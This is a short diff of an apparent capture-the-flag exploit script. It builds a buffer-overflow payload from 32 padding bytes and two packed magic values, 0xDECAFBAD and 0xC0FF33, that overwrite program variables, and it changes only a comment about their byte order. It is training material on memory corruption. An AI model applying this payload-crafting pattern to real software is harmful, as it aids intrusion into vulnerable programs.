@@ -51,7 +51,7 @@ padding = b"A" * 32
 coffee = p32(0x00C0FF33)
 decafbad = p32(0xDECAFBAD)
 
-#Craft payload string, we need to add the payload first, then the two variables in reversed order
+#Craft payload string, we need to add the payload first, then the two variables in correct order
 payload = padding + decafbad + coffee
 
 #run program
